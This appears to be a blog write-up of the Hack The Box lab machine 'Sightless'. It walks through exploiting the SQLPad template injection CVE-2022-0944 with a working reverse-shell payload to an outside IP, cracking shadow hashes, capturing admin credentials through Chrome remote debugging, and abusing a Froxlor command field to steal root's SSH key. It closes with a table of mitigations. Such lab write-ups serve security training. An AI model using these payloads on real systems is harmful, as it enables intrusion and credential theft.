---
title: "Hack the Box (HTB) - Sightless"
description: "?"
date: 2027-09-07 12:00:00 -100
image: /assets/images/HTB - Sightless/Sightless Thumbnail.jpg
categories: [CTF]
tags: [test]    # TAG names should always be lowercase
---

## Enumeration

Let's run [Nmap](https://nmap.org/book/toc.html) against our box at `10.10.11.32`

```bash
nmap -sC -sV -O -p- 10.10.11.32 -oN nmap
```

### Open Ports and Services

| Port   | Service | Version/Details                            |
|--------|---------|--------------------------------------------|
| 21/tcp | FTP     | ProFTPD Server (sightless.htb FTP Server)  |
| 22/tcp | SSH     | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10           |
| 80/tcp | HTTP    | nginx 1.18.0 (Ubuntu)                      |

As indicated by our namp scan on port 80, it didn't follow redirect to `http://sightless.htb` which indicates named based virtual hosting. This allows multiple websites to run on a single server, using the same IP address and port. This is resource efficient as you obviously don't need multiple IPs or servers

Anyway, let's map sightless.htb in our local DNS file `/etc/hosts` and check out the server

![Web Page](/assets/images/HTB%20-%20Sightless/sightless%20web%20page.png)

Investigating the HTML source code, I find the following

![HTML Source](/assets/images/HTB%20-%20Sightless/HTML%20source%20code.png)

We see a `sqlpad.sightless.htb` subdomain listed here. Let's add that to our ***/etc/hosts*** file and move forward

Navigating to the subdomain, we see the following

![SQLpad](/assets/images/HTB%20-%20Sightless/sqlpad%20subdomain.png)

SQLpad is an open-source web application that allows interaction with databases through a GUI

Anyway, let's see if we can discover some additional Information about this application

![SQLpad version](/assets/images/HTB%20-%20Sightless/SQLpad%20version.png)

Rhe application is running version `6.10.0`. As always, let's do some quick research into vulnerabilities associated with this version

![CVE-2022-0944](/assets/images/HTB%20-%20Sightless/CVE%202022-0944.png)

We discover ***CVE-2022-0944***

![CVE](/assets/images/HTB%20-%20Sightless/CVE.png)

It looks like there's a template injection RCE in versions of SQLpad prior to 6.10.1, which is applicable to us

The vulnerability exists in the `/api/test-connection` endpoint, where SQLPad users can provide database connection details. Due to improper input sanitization, a template injection occurs, allowing attacks to inject malicious code into the system

SQLPad is built on Node.js, and it processes user input via template engines. Node.js provides access to powerful modules, including **child_process** module, which acn be used to execute system commands

We will be utilizing this exploit to spawn our reverse shell

![Setting up connection](/assets/images/HTB%20-%20Sightless/Setting%20up%20connection.png)

```bash
## The payload
{{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.36/9001 0>&1"') }}

## Have nc listener ready
nc -lvnp 9001
```

![Shell](/assets/images/HTB%20-%20Sightless/Shell.png)

We have shell access to the container running the SQLpad application. We can't run many basic commands like `ps` and `netstat` as it's common in Docker containers to be stripped down to the bare minimum necessary

Since we have root on this container, let's check the `etc/shadow` file

![Password](/assets/images/HTB%20-%20Sightless/Michael%20Password.png)

We get the password for root and Michael. Let's attempt to crack these

```bash
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

![Cracked](/assets/images/HTB%20-%20Sightless/Passwords%20cracked.png)

We were successfully able to crack both passwords

- Root password: `blindside`
- Michael password: `insaneclownposse`

Since this box is running SSH, I am going to check for password reuse

```bash
ssh michael@10.10.11.32
```

![User Access](/assets/images/HTB%20-%20Sightless/User%20access.png)

## Privilege Escalation

Now that we have user level access, let's enumerate to find ways of escalation

I suppose we should simply see if we can switch to root with that docker root password

![Authentication Fail](/assets/images/HTB%20-%20Sightless/authentication%20failure.png)

No dice, let's do some enumeration to see what we can find

![User John](/assets/images/HTB%20-%20Sightless/User%20john%20discovered.png)

We discover this user `john`. I tried to see if they were in the sudoers file but was unable to read 

Running linpeas reveals the following

![Linpeas](/assets/images/HTB%20-%20Sightless/Linpeas.png)

We see that `--remote-debgging-port` is highlighted as an escalation vector. The remote debugging tool allows someone to monitor the headless chrome browser that's running on the target machine

- The ***headless Chrome browser*** running on the target is performing some automated tasks or interacting with web pages, (in our case the Froxlor service on 8080)

The `-port=0` means it's picking a dynamic port. I am going to forward every port to our attacker machine

```bash
ssh -L 37707:127.0.0.1:37707 -L 3000:127.0.0.1:3000 -L 33060:127.0.0.1:33060 -L 8080:127.0.0.1:8080 -L 53:127.0.0.1:53 -L 34121:127.0.0.1:34121 -L 3306:127.0.0.1:3306 -L 38119:127.0.0.1:38119 -L 80:127.0.0.1:80 michael@10.10.11.32
```

Now with these forwarded to our machine, we can head over to a ***Chromium*** and navigate to `chrome://inspect/`

![Chrome Inspect](/assets/images/HTB%20-%20Sightless/Chrome%20inspect.png)

We'll add `localhost:34121` (or whatever port was dynamically added for you) to the discovery settings as this will allow us to inspect and interact wit the Chrome browser running on the ***target machine***

![Remote Target](/assets/images/HTB%20-%20Sightless/Remote%20target.png)

We can clearly see that the admin panel for `Froxlor` is being navigated to. Let's hit ***inspect*** and take a look

![Password for admin](/assets/images/HTB%20-%20Sightless/password%20for%20admin.png)

Aha, checking the request, we can see the payload and conversely, the cleartext username & password as `admin` `ForlorfroxAdmin`

Let's head over to the admin panel and login

### Understanding this application

Froxlor is a open-source application that provides a GUI for managing web hosting services (web sites, email accounts, databases). This is useful if you want to manage hosting services directly and not rely on 3rd party cloud subscriptions as well as have full control over your own data

Let's login to the admin panel now

![admin panel](/assets/images/HTB%20-%20Sightless/admin%20panel.png)

Hmm, let's take a look around

![PHP section](/assets/images/HTB%20-%20Sightless/PHP%20section.png)

There's this PHP section, which in Froxlor is where sys admins can manage settings related to PHP

This `php-fpm restart command` is a command that tells the server to restart the PHP-FPM (FastCGI Process Manager) service, which handles PHP processing for web applications. It ensures that the settings or changes (like adjusting the PHP version or memory limits) take effect WITHOUT needing to manually restart the server, effectively minimizing downtime

Since we have access to modify this command, we may be able to inject arbitrary command that will be execute by the server when PHP-FPM is restarted

Let's edit the field to test for RCE. In our case, let's just try creating a file in the tmp directory

![Command](/assets/images/HTB%20-%20Sightless/Command.png)

Now, let's wait and see if it creates a file

![RCE](/assets/images/HTB%20-%20Sightless/RCE.png)

Sure enough, we see the `test` file is there

Let's copy roots private key and paste it into the tmp folder

![Copy Private Key](/assets/images/HTB%20-%20Sightless/cp%20private%20key.png)

![Root Key](/assets/images/HTB%20-%20Sightless/Root%20key.png)

Unfortunately, the key is only accessible by root. We can run another command to give it access to everyone

`chmod 777 /tmp/root_key`

Now the key should be accessible to everyone, we can easily copy it on our attacker machine

Once on the attacker machine, run one last command to give it the necessary permission to use via SSH

```bash
chmod 600 root_key
```

Now SSH as root using the private key!

```bash
ssh -i root_key root@10.10.11.32
```

![root](/assets/images/HTB%20-%20Sightless/Root.png)

GG, we've rooted Sightless!

## Vulnerabilities & Mitigations

| **Vulnerability**                                | **Description**                                                                                                                                                     | **Mitigation**                                                                                                                                                               |
|--------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **SQLPad Template Injection (CVE-2022-0944)**    | SQLPad version 6.10.0 has a template injection vulnerability in the `/api/test-connection` endpoint, leading to remote code execution.                               | Upgrade to SQLPad version 6.10.1 or higher. Always sanitize and validate input parameters to prevent injection attacks.                                                      |
| **Password Reuse**                               | The same password from the Docker container was reused on the host machine, allowing attackers to escalate privileges.                                           | Enforce unique, complex passwords across services. Implement password policies to prevent reuse and ensure regular password changes.                                          |
| **Exposed Remote Debugging Port**                | The Chrome browser on the target had an exposed remote debugging port, allowing attackers to inspect and manipulate the browser on the target machine.               | Disable remote debugging ports or restrict access to trusted users. Secure remote services with authentication and limit external access.                                    |
| **Weak Froxlor Admin Credentials**               | Weak admin credentials (`admin`/`ForlorfroxAdmin`) were exposed via the remote debugging interface, allowing unauthorized access to the Froxlor panel.                | Use strong, unique passwords for admin accounts. Implement multi-factor authentication (MFA) for admin access, and avoid storing passwords in plain text.                   |
| **Command Injection in PHP-FPM Restart Command** | Froxlor allowed arbitrary command execution by modifying the `php-fpm restart command`, leading to remote code execution (RCE).                                       | Validate and sanitize input in web forms that allow users to input commands. Limit access to critical system commands with role-based access controls (RBAC).                |



